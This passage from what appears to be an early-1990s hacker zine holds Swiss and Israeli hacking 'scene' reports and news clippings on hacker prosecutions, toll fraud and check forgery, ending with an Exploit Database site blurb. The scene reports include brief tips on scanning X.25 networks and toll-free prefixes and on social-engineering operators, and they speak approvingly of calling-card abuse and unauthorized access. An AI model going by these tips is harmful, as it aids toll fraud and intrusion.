are almost exclusively universities or large corporations, they don&#039;t cater
much to individuals. Most of the Network operates at 2..10 Mb/sec, SWITCH uses
cisco hardware.

The other provider, CHUUG, founded by Simon Poole does cater to individuals
(they offer some for of pub access unix, + slip + uucp/news/mail feed), their
links, which last time I looked went via Germany and Holland are somewhat
slower. CHUUG also links some smaller companies (improware for instance)
Apart from the Swiss Internet, there is a DECNET based Network called CHADNET,
managed by SWITCH which also links the Swiss universities. There is even a
gateway to HEPNET and SPAN at the Paul Schaerrer Institute (PSI) in Zuerich.
Due to the restrictions in DECNET you need to use poor man&#039;s routing to get
anywhere.

Some of the universities have non ip internal networks, the most notable
being KOMETH, which links the university of Zuerich and the ETHZ, most
universities however just use their ethernets and don&#039;t have any fancy hardware.
Apart from this Switzerland has it&#039;s own PDN, Telepac, operated by the Swiss
Ptt (our federal telecommunications agency) with dnic 2284. This network
is accessible at speeds of up to 9600 bps at a fixed charge all over the
country. Apart from Telepac their are several other x25 based networks
directly accessible from Switzerland, notable Sprintnet, with dialins in
Zuerich and Bern, Tymnet with Dialins in Zuerich and Neuchatel, and Infonet.
Last but not least Switzerland has a national vtx system (which i&#039;ve never
used, and i&#039;m proud of that) called Videotext, which is linked to BTX in
Germany, Prestel in England and Minitel in France. The only reason for using
was the fact that up till recently it could be accessed for free via our
equivalent of the 1-800 number (ours start with 155). The ptt now claims that
this was a &quot;mistake&quot; (some mistake considering it lasted for two years and
was used by everyone and his dog.....but I digress.)

Hacking in Switzerland
----------------------
Well there&#039;s not much of a scene here. I have known a few (5-10) Swiss hackers
and one or two good ones, but that doesn&#039;t go very far. As for boards, I can&#039;t
think of any right now. BGB (with nua 0208046451064) used to have a hacker
corner, but that&#039;s been closed for some years now I think. Pegasus
(022847521257) which runs on a vax under vms is quite a nice system, where on
occasion you meet people with an interest in vms.

I don&#039;t know of any conventions in Switzerland, we&#039;ve tried to organize one
once (we ended up with three people). Hacking incidentally is illegal in
Switzerland, but only as of this year.

Phreaking in Switzerland
------------------------
I don&#039;t know much about Phreaking (anything ?). The Swiss telephone system
is a very modern one, and nearly identical to the one in Sweden. This means
that any of the old methods suitable for older exchanges (most notable blue
boxing) don&#039;t work. There are some limited possibilities via our 1-800
system, but Switzerland phone systems aren&#039;t easily abused. The switches
incidentally are Siemens AX-10 (does that meen anything to anybody ?)
I know of one or two good phreaks (rather than card abusers) in Switzerland.
Phreaking and any messing with telephones, unlike hacking, has always been
illegal in Switzerland.

Some Incidents
--------------
Well here&#039;s for old times sake. (doubt this can do any harm any more)

1)
I&#039;ve already mentioned the Swiss X.25 Network Telepac. To use this you need
a nui, which is usually an 8 character string, and a password, which is six
characters, mixed upper and lower case + usually numbers. Well obviously
the ptt has nuis for internal use, as in this case the one for the employees
of the ptt headquarters in Bern. The nui it seems was available to all the
employees needing access and someone let the secret get out... so for two
years every hacker in Switzerland used this nui to make x25 calls round the
world. In fact it became so popular that the German hackers near the border
found it worth their while to pay the ld charges to Switzerland just so they
could use this nui. Eventually someone noticed. The cost must have been
phenomenal.

2)
An acquaintance got into the Vax cluster of BAG (our equivalent to NIH).
The people at BAG eventually noticed and kicked him out. In their press
release to the incident, while being forced to admit that someone had got
in they made a firm point of how &#039;secure&#039; they were, and explained that it
was impossible that anyone had seen any personal data on People registered
as HIV positive. Well this was such an obvious cover-up that my acquaintance
decided to give them a piece of his mind, so he called the national radio,
and gave them an interview live on his motives and accomplishments.
BAG continued to deny his version (but changed all their passwords.)

                           The Israeli Scene

                                   by

                               Herd Beast


      Didn&#039;t you always want to know about the &quot;scene&quot; in Israel?
                                 YOU WILL...

A SMALL OVERVIEW
****************

This article was written after I read Phracks 42/43, and the idea seemed
good.  I am not affiliated with any person or any group mentioned
in this file.

It&#039;s hard to describe the &quot;Israeli scene&quot;, so I will start with a short
description of the state of technology in Israel.

TECHNOLOGY
**********

The Israeli telephone system isn&#039;t very advanced.  Most of the country
still doesn&#039;t even have tone dialing, and while the phone company has
rAd plans about installing CLID and a pack full of other exciting things,
the fact remains that half the country breathes rotary phones and analog
lines.  Pathetic as it seems, it still means that tracing someone through
the phone lines can be rather hard; it also means that K0D3 scanning is
abundant.

After the telephones comes the X.25 connection, Isranet: DNIC 4251.
Isranet used to be a &quot;hassle free system&quot;, eg every 11 year old could
get a NUI and use it, and NUIs lasted.  Those merry times in which
practically everyone who had a modem was an X.25 &quot;hacker&quot; are almost
over.  The weakness of Isranet (the telco&#039;s fault!) is why if you happened
upon QSD some years ago, you would have probably noticed that after Italian
lesbians, Israelis lurked there the most.  Recently, Isranet switched
systems.  The old system that just prompted NUI? and ADD? is gone, and
in came the SprintNet (Telenet) system.  It is now generally believed
that Isranet is un-crackable.  Way to go, Sprint, ahem.

Amongst other thing the Israeli phone company supplies besides an X.25
network is an information service (like 411) through modem, e-mail/FAX
and database systems (a branch of AT&amp;T EasyLink) and a bunch of other things.
Not to forget the usual &quot;alien&quot; connections, like a TYMUSA connection
(with very low access levels), and toll free numbers to the AT&amp;T USA*Direct
service and sexy-sounding MCI &amp; Sprint operators.

To my knowledge, cellular telephony among phreaks in Israel is virtually
non existent, (that is to say, when talking to phreaks, none of them seems
to care about cellular phones at all, for different reasons one of them
being the starting price which is high), which is a pity but is also a
blessing since security is lax and besides, the Israeli cell phone market
is monopolized by Motorola (whose cell phones re known as &quot;Pele Phones&quot;
which means &quot;Wonder Phones&quot;).

As you might have understood, up until lately, the Israeli phone company
(Bezeq) wasn&#039;t very aware of security and boring stuff like that.  Now
it&#039;s becoming increasingly aware, although not quite enough.  The notion
in Israel is that hackers are like computer geniuses who can get into
ANYWHERE, and when last did you see someone like that?  So basically,
corporate security is lax (does &quot;unpassworded superuser account&quot; ring a
bell?), although not always that lax.

Last but not least are the elytee -- the computer literate public.
These are most of the people in charge of machines on the *.il domain on
the Internet.  Security there is better than usual, with (for example)
&quot;correct password&quot; rules being observed, but (another example) with holes
like /usr/lib/expreserve on SunOS still open.  For this reason, there is a
difference between hackers in Israel.  There are university students who
play around with the Internet, hack, and are usually not aware that
there is a bigger hacking community beyond IRC.  Then, there are the
modemers, who use modems and all the other things, but are generally not
as proficient, since Internet access in Israel is given only to
university people and employees of the very few companies who have
Internet connections.  (The notion of public access Unix exists, but
access costs $50 a month and to get it one must have approval of the
ministry of communication because of an old law; and since calling up a
system and running by all the defaults usually does not work, not
everyone has access to the Internet.)

Calling card abuse is very popular in Israel, because Bezeq cannot find
abusers and really doesn&#039;t care.  Therefore there are a lot of pirates
in Israel who are in very good touch with American pirate groups, and
this includes the works - crackers, artist, couriers.  If you know a bit
about the pirate community, good for you.

Hackers as in computer hackers are a little rarer.  To become a hacker you
need to pass some grueling tests.  First, you resist the lures of becoming a
calling card and download junkie.  Then, you have to become proficient
from nothing.  Finally most of the Israeli hacking community
hacks for the single reason that goes something like &quot;get into QSD&quot;,
&quot;get into IRC&quot; (without paying).  Not very idealistic, but it works...

Assuming you passed all these stages, let&#039;s say you are 18... and you go
to 3 years in the army.  Did I forget to mention that serving in the
army is mandatory in Israel?  Not really relevant, but that&#039;s life in
Israel, and when you leave the army, you usually forget about hacking.

Up until now I was just explaining things.  Now..

THE PARTICULARS
***************

I will concentrate on the &quot;modemers&quot; in this section, so first about the
students.  You may know this, but there is a lot of &quot;bad&quot; Internet
traffic on *.il, in the form of pirate/virus FTPs and stuff like that.
If you read Usenet, you probably saw at some time a wise ass post such a
site.  These are usually the works of students.  To be honest, that&#039;s as
much as I know, since I&#039;m not a student and my stupidity is not so high
as to assume every Internet user from *.il is a student...

The &quot;serious&quot; modemers hackers don&#039;t really hang out in big groups.
They have close friends or work alone, so there is nothing like Israeli
######Cons.  I can&#039;t make an estimate of the actual amount of hacking
done in Israel, but I do know that a lot of people got drafted lately.
Other than that, there are a lot of Israelis hanging around on IRC (if
you&#039;re into that), but they usually work like k0D3 k0ll3kt0rZ, only
instead of codes they collect Unix account.

In a country that has fewer people than NYC, the total number of
people who actually have modems and do hack AND know what they&#039;re doing
is not so large, which is why until now my description didn&#039;t sound very
pretty.  But considering these facts, they&#039;re actually not bad.

There are some &quot;underground&quot; groups in Israel.  Not exactly groups as
magazines -- if there is one thing Israel is full of it&#039;s local
magazines.  These are usually small releases featuring things like &quot;FTP
Tutorial&quot; and &quot;Pascal Trojan&quot; along with several oh-so-accurate anarchy
files.  The most prominent, and in the fact the only magazine to have
lasted beyond one issue is called IRA (International Raging Anarchists).

For the sake of the pirates, an Israeli formed group that also has
American members is called HaSP; it usually releases cracks for all
kinds of software.

THE NETWORK
***********

Some time ago there was an attempt to bring up a hacking network in
Israel.  It was called the IHPG (Israeli Hack Phreak Group) and was
a bunch of FidoNet-style echos passed between underground boards.  The
subjects on hand were hacking, phreaking, trojans, and viruses.  At first
there was a genuine attempt to make things happen, but almost no one shared
information (more accurately, accounts/passwords/codes) and the net
slowly died out.  To my information it is still operational on around 3
boards around Israel, with something like 3 posts per month.

LAW AND ORDER
*************

The law and the establishment in Israel are divided.  For starters,
there is the wide public opinion among the public that every hacker, in
particular those who get caught are computer geniuses.  Therefore, in a
lot of cases where hackers (usually university students) get caught, they
are given a better position within the computer staff, or are later hired
by a company (no matter what for -- and it&#039;s not always security).
Although police and Bezeq do preach that hacking is a crime etc, I seriously
doubt that there will be such an outrage among computer people if someone
was to go on and build an Israeli ComSec (as an example).

Police has a very limited staff assigned to computer investigations,
(along the lines of 1-2 officers), and they are in charge of everything;
this means they should check calling carders, but also on bank
embezzlers who keep information on &quot;secure&quot; floppies.  Guess which cases
get priority?  Of course, there is still the phone company and when
things get more serious more man force is issued.

&gt;From time to time, however, there are arrests (see PWN on Phrack 35,
38 elsewhere).  These usually involve (in the case of the guy described on
Phrack 35) a tip from police overseas, who kept bugging the Israeli
police until they made a move, or idiots who sell things.  The guy in
the Phrack 35 World News, Deri Schreibman, was arrested after he
supplied credit cards to people in the U.S. and Canada, who turned him
in when they got caught.  He himself turned in a lot of people, but his
information &quot;just&quot; led to them being visited.  Nothing much has been
heard about that since, but his case got a lot of publicity because he
had a lot of computer equipment, including this/that-boxes, and was
said to have broken in Washington Post and the Pentagon.  After him,
there have been raids on hackers but nothing serious happened to them,
and the news coverage was not incredible.  A year or so ago one total asshole
went on a national show (nothing like Geraldo) and told everyone how he too,
abused Isranet and the Washington Post; he also claimed that Bezeq
didn&#039;t have a clue and that was why he wasn&#039;t afraid.   He was visited and
his equipment was taken.  At much earlier times there was a teenager who
changed an article on the last page on an Israeli newspaper to say that his
math teacher had been arrested for drug dealing; he got to write a computer
program to aid blind and deaf people.  That is the general way busts go on
in Israel, because there is no such great danger as to even warrant dreams
of something like Sundevil.  There are also sometimes problems in the army,
but they are dealt with internally, by the army (I don&#039;t think anyone
gets shot though).

When a bust occurred, usually many people quit fooling around with
Isranet for a while, because all those who did get caught were doing the
same things with Isranet.  But except for that, there were no great
waves in the pond after busts, except again for the Deri S. case.  This
is due simply to the fact that hackers, in Israel and usually anywhere
else, simply don&#039;t amount to the amount of problems &quot;professional&quot;
criminals make to the police, (the same way Israeli software houses chase
down pirating firms and not boards), and since Israel doesn&#039;t have an
FBI and/or USSS the law isn&#039;t going around pointing guns at hackers.

HACKING IN ISRAEL
*****************

Hacking or phreaking in Israel in not very sophisticated.  The average
Israeli can scan all he likes; Israeli toll free numbers in the format of
177+Country Code+XXXX exist to almost every country.  This means that by
dialing 177 (= 1-800), a country code (440 for the UK, 100 for AT&amp;T, 150
for MCI, etc), and a number on the XXXX format, you have a chance of
connecting to a number in country whose country code you&#039;re using.
Voice mail systems, modems and other things can be found there
(h00ray!).

There are also calling cards and X.25 and 056 (= 1-900) scams, etc, etc.

A nice way to start scanning (if anyone is interested) the 4251 DNIC is
based on area codes (yes, just like Telenet).  For example, a lot of
systems in the 04 area code will be somewhere at: 4251 400 ...  This
might lead to disappointing results, though, since most systems use Hebrew
(most interesting systems).  The best way to get Israeli area codes is by
using a file on international country/area codes put out a while ago...
Funny, but it&#039;s more accurate than a C&amp;P phone book.

If you&#039;re into social engineering foreigners, give 1 800 477-5664 (AT&amp;T)
or 1 800 477-2354 (MCI) a call.  These will get you to an Israeli
operator who will be happy to place a call for you, if you&#039;re into
experimenting (another one of Bezeq&#039;s new services, called
Israel*Direct... also available from the UK, Ireland, Germany and more.)

CONCLUSION
**********

I hope you have learned about the Israeli scene.  My purpose was NOT to
dis anything, it was to show that even though we live in this
global village of networks and electronic data exchange (ohh), living in
outer butt-fuck (I did not invent this term) has its advantages, in the
form of basic stupidity, and its disadvantages in the form of lack of
technology and organization in the community.  Yeah.

There are still many nice things about hacking in Israel.  Enjoy your life.

Feds Pull The Plug On Phiber Optik                             November 4, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Joshua Quitner (Newsday) (Page 57)

The biggest case of computer intrusion in US history drew to a close yesterday
when a young Elmhurst, Queens, man was sentenced to a year and a day in jail
for his part in an electronic gang that, for years, roamed the nation&#039;s
largest telephone and data networks.

Mark Abene, 21, renowned in the digital underground as Phiber Optik, was the
last of five young New York City men to plead guilty in federal court to one
felony count of conspiracy for being in a hacker group known as MOD.

Abene apologized for his deeds yesterday.  &quot;I&#039;m just sorry they were
misconstrued as malicious in any way,&quot; he said in Manhattan&#039;s federal
district court.

Prosecutors claimed that the young men rumbled on computer networks,
disconnecting other hackers&#039; phone service and posting embarrassing
information culled from confidential credit networks like TRW on
underground bulletin boards.  They also used their power skills to get
telephone numbers or credit reports for celebrities, including Julia
Roberts, John Gotti, Geraldo Rivera, Christina Applegate and Mad Magazine
founder William Gaines.

John Lee, 22, a co-defendant is now serving a one year sentence in a
&quot;shock incarceration&quot; boot camp in Lewisburg, PA.  Lee and Julio Fernandez,
18, were the only gang members who made money from the two years of
break-ins.

In addition to Lee and Fernandez, Paul Stira, 23, of Cambria Heights,
Queens, and Elias Ladopoulos, 24, of Jamaica, Queens, are serving six-month
sentences in federal prisons in Pennsylvania.  Fernandez has been cooperating
with authorities and is not expected to be jailed.

NCIC Abuse - Is Legislation The Answer                            October, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Brian Miller

Confidential information is being illegally released from the National
Crime Information Center network.  But abuse of the system is difficult
to detect, and those caught are seldom punished.

A former law enforcement officer tracked town his ex-girlfriend with
information from an FBI-run law enforcement information system.  Then
he killed her.

A terminal operator in Pennsylvania used the same system to conduct
background searches for her drug dealing boyfriend to see if his customers
were undercover agents.

It is hard to trace abuse to a single user because many agencies don&#039;t
require personal access codes which would keep track of who made specific
inquiries on the system and when they occurred.  The General Accounting
Office polled all the states and found that 17 don&#039;t require a personal
code to access the NCIC.  Most of these had an identifier only for the
terminal or agency accessing the system.

And if someone is caught abusing the system, they are seldom charged with
a crime.  The GAO found that the most common penalty was a reprimand, with
some suspensions and firings.  Of the 56 cases of abuse found by the GAO,
only seven people were prosecuted.

The FBI cannot force the states to adopt certain security measures
because compliance with the guidelines is voluntary.  The reason for this is
that the guts of the NCIC come from the states, and the FBI simply
maintains the network.

&quot;The main thing that can be done today is to enforce the law, and create
stronger penalties for abusing the system,&quot; said Marc Rotenbertg of
Computer Professionals for Social Responsibility, an advocacy group
based in Palo Alto, California.

Security Products Abound, But Is Toll Fraud Too Tough?          August 30, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
by Dan O&#039;Shea (Telephony) (Page 7)

Telecommunications toll fraud is an increasingly popular crime that
collectively costs its victims billions of dollars each year.  Although
carriers have responded with a wave of security products and services,
the problem might be much bigger than was once thought.

Some carriers claim that industry wide toll fraud losses amount to between
$2 billion and $5 billion a year, but the true figure is closer to $8 billion,
according to Bernie Milligan, president of CTF Specialists Inc.,
a consulting group that studies toll fraud and markets security services to
large corporate telecommunications users.  [ed: remember HoHo Con?  Yes...THAT
Bernie]

Toll fraud involving calls coming into AT&amp;T&#039;s 800 network dropped 75% since
the introduction of NetProtect, while Sprint estimates a 95% decrease from
last year (since the introduction of their fraud detection service).  Average
losses across the industry have plummeted from $120,000 per incident to
$45,000.

Despite the offensive against telecom fraud, the problem persists and is
becoming more frequent, and new technologies will only represent potential
new adventures for hackers, CFT&#039;s Milligan said.  Hacker activity is growing
at an annual rate of 35%.  Some 65% to 80% of toll fraud involves
international calling, and fraud occurs on a much wider scale than just
inbound 800 calls, Milligan said.  So, while losses of this type of fraud
drop, collective fraud losses are increasing by 25% each year.  Customers
are still liable financially in toll fraud cases, and the carriers continue
to get paid.

Welcome to desktop forgery.

Susan Morton, senior forensic document examiner with the US Postal Service
in San Francisco, has seen gangs travelling the country packing computers,
scanners, and laser printers.  Arriving in town, their first move is to rob
a mailbox to acquire some checks that were mailed to, say, a local utility
company.  They will copy the account and routing code off some citizen&#039;s
check and decide what branch bank that person probably uses.  Then they forge
a large corporate or government check to that person, using information from
other checks they found in the mail.  Packing a forged ID, a gang member
will then go to a branch across town where presumably nobody knows the
citizen and deposit part of that forged check.  The check may be for $5000,
of which the forger takes $2000 as cash, smiles and leaves.

One check forging gang was chased across Texas for about six months in the
late 1980s, recalls Robert Ansley, corporate security manager for Dell
Computer in Austin, Texas, then with the Austin police department.  Armed
with a stolen Macintosh and an ID maker stolen from a highway patrol
substation, they passed more than $100,000 in bogus checks in Austin alone.

Sources say other gangs have used laser printers to forge security ID
badges to get into office buildings and steal the computers, nodding at the
friendly security guard at the front desk while trudging out with their
arms full.

&quot;We have been urging corporations to move forward with EDI (Electronic
Data Interchange) for more and more of their business transactions and
avoid paper, since it will become so vulnerable,&quot; says Donn Parker,
computer crime expert with SRI International in Menlo Park, California.

Intel To Protect Chips                                         October 22, 1993
~~~~~~~~~~~~~~~~~~~~~~
(Newswire Sources)

One of the nation&#039;s largest manufacturers of computer chips said Friday it
will start to put serial numbers on its products in an effort to stem the
rising tide of robberies.  Intel Corp. said it was taking its actions
after a flurry of armed takeover robberies at warehouses in California&#039;s
Silicon Valley over the last six months.

What the robbers are after is microprocessors -- the brains that power
personal computers. Among their favorite targets has been Intel&#039;s 486
microprocessor.

Julius Finkelstein, head of Santa Clara&#039;s High Tech Crime Task Force,
called chip robberies &quot;the gang crime of the 1990s.&quot;  &quot;They are just
as valuable as cocaine,&quot; he said. &quot;But they are easier to get rid of
and if you are caught the penalties aren&#039;t as severe.&quot;

The gangs, Finkelstein said, are Asian, well organized and very
knowledgable about computer components. They generally drive up to a
warehouse door as if coming for a shipment, but once inside pull out
their weapons and force the employees to the floor.

Last month, a takeover robbery at the Wylie Laboratories Electronic
Marketing Group in Santa Clara netted thieves an estimated $1 million in
chips. Finkelstein said that robbery took only about 15 minutes.

Lt. Rob Davis said the robbery began at 1:01 a.m. when as many as
five gunmen forced their way into the Top Line Electronics Co., a
computer board manufacturer. The bandits rounded up the employees and
beat them in an attempt to find where the computer parts were stored.

One employee was shot in the hip as he tried to escape. Davis said
the man was treated at a local hospital and was listed in stable

Hacker Revelled In Spotlight, Court Told                        August 23, 1993
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
(The Age)

A hacker who broke into a computer at NASA in the United States,
and contemplated sending it a message not to launch a space shuttle, was
delighted with the effect he was having, the County Court was told yesterday.

The prosecutor, Mr Richard Maidment, said that in a three-way
conversation between Nahshon Even-Chaim,  David John Woodcock
and another computer hacker, Woodcock discussed sending a message
to a computer at NASA to stop the launch of a space shuttle, after
Woodcock talked about the shuttle Challenger, which blew up several
years before, and said &quot;I have got to do something about NASA.&quot;

Even-Chaim, 22, formerly of Narong Road, Caulfield, yesterday
pleaded guilty to 15 charges relating to unauthorized obtaining,
altering, inserting, and erasing of data stored in a computer, and
the interfering and obstruction of the lawful use of a computer.

Woodcock, 25, formerly of Ashleigh Avenue, Frankston, pleaded
guilty to two counts of being knowingly concerned in the obtaining
of unauthorized access by Even-Chaim to data stored in a computer.

The court was told that a co-offender, Richard Martin Jones
was earlier sentenced to six months jail, but was released on a $500,
six-month good behavior bond.

The court was told that Even-Chaim obtained free use of telephone
lines for many hours to connect his home computer to other systems
in the United States.

Mr. Maidment said that Even-Chaim, Woodcock, and Jones, who
collectively called themselves &quot;The Realm&quot;, were arrested in April 1990
by the Australia Federal Police after an investigation that began with
information received from the United States Secret Service.

The Last Hacker                                              September 26, 1993
~~~~~~~~~~~~~~~
by Jonathan Littman (LA Times)

[This is the bet article I&#039;ve seen yet about Kevin Poulsen.  Please go
 find it and read it.  It covers Poulsen from beginning to end.  All the
 crazy stunts, the life on the run, the show down with the feds.  Everything.
 Here is a small excerpt.]

KIIS-Fm called it a &quot;Win a Porsche by Friday&quot;: eight Porsches - about
$400,000 worth of steel, leather and status - given away, one a week. You could
hardly live or work in Los Angeles without being caught up in the frenzy. It
seems that the gleaming, candy-red convertibles were plastered on nearly every
billboard and bus in town. Listeners were glued to KIIS, hoping to make the
102nd call after Dees spun the third song in the magical series.

Housewives, businessmen, students and contest freaks jammed the lines with
their car phones and auto-dialers. They all had hopes, but one 24-year-old high
school dropout had a plan. America&#039;s most wanted hacker and his associates
sat by their computers and waited. On the morning of June 1, 1990 KIIS played
&#039;Escapade,&#039; &#039;Love Shack; and then, yes, &quot;Kiss.&quot; &quot;We blew out the phone lines,&quot;
every line was ringing says Karen Tobin, the stations promotional director. &quot;We
picked up the calls and counted.&quot;

The hacker was counting too. At the precise moment Price&#039;s &quot;Kiss&quot; hit the air
he seized control of the station&#039;s 25 phone liens, blocking out all calls but
his own. Then the man, who identified himself as Michael B. Peters, calmly
dialed the 102nd call and won a Porsche 944 S2.

It was child&#039;s play. Especially for Kevin Lee Poulsen. Computer hacking had
once seemed an innocent obsession to Poulsen, a native of Pasadena, but now it
was his life, and it had taken him over the line. This October, Poulsen will
face the first of two trials, one in San Jose and another in Los Angeles, that
federal prosecutors say are critical to the government. Because of the
seriousness of his alleged breaches of national security, they intend to use the
case as an example to the hacker underground.

As a teen-ager, Poulsen had burrowed deep into the giant switching networks
of Pacific Bell, exploring and exploiting nearly every element of its powerful
computers, from the common systems responsible for creating, changing and
maintaining phone service to the shadow systems that guard the secrets of
national security, according to accusations in a federal indictment. The U.S.
attorney in San Jose says that Poulsen had wiretapped the intimate phone calls
of a Hollywood starlet, allegedly conspired to steal classified military orders,
and reportedly uncovered unpublished telephone numbers for the Soviet Consulate
in San Francisco.

                    <p>The <a href="/google-hacking-database">Google Hacking Database (GHDB)</a>
                        is a categorized index of Internet search engine queries designed to uncover interesting,
                        and usually sensitive, information made publicly available on the Internet. In most cases,
                        this information was never meant to be made public but due to any number of factors this
                        information was linked in a web document that was crawled by a search engine that
                        subsequently followed that link and indexed the sensitive information.
                    </p>

                    <p>The process known as “Google Hacking” was popularized in 2000 by Johnny
                        Long, a professional hacker, who began cataloging these queries in a database known as the
                        Google Hacking Database. His initial efforts were amplified by countless hours of community
                        member effort, documented in the book Google Hacking For Penetration Testers and popularised
                        by a barrage of media attention and Johnny’s talks on the subject such as this early talk
                        recorded at <a href="https://www.defcon.org/html/links/dc-archives/dc-13-archive.html"
                                       target="_blank" rel="noopener">DEFCON 13</a>. Johnny coined the term “Googledork” to refer
                        to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
                        the fact that this was not a “Google problem” but rather the result of an often
                        unintentional misconfiguration on the part of a user or a program installed by the user.
                        Over time, the term “dork” became shorthand for a search query that located sensitive
                        information and “dorks” were included with may web application vulnerability releases to
                        show examples of vulnerable web sites.
                    </p>

                    <p>After nearly a decade of hard work by the community, Johnny turned the GHDB
                        over to <a
                                href="https://www.offensive-security.com/community-projects/"
                                target="_blank" rel="noopener">Offensive Security</a> in November 2010, and it is now maintained as
                        an extension of the <a href="/">Exploit Database</a>. Today, the GHDB includes searches for
                        other online search engines such as <a href="https://www.bing.com/" target="_blank" rel="noopener">Bing</a>,
                        and other online repositories like <a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>,
                        producing different, yet equally valuable results.
